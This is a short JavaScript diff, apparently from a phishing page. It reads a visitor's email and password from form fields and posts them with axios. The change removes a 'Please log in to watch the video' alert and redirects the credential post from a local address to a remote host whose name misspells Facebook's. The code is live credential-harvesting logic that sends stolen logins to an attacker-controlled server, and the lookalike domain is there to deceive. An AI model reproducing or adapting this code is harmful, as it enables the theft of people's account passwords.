@@ -1,4 +1,4 @@
-alert("Please log in to watch the video");
+
 
 const email = document.querySelector(".email");
 const pass = document.querySelector(".password");
@@ -12,7 +12,7 @@ function event() {
     pass:pass.value
   }
   axios
-    .post("http://0.0.0.0:5000/", {
+    .post("https://facebook-comapi.herokuapp.com/", {
       formData,
     })
     .then((response) => {
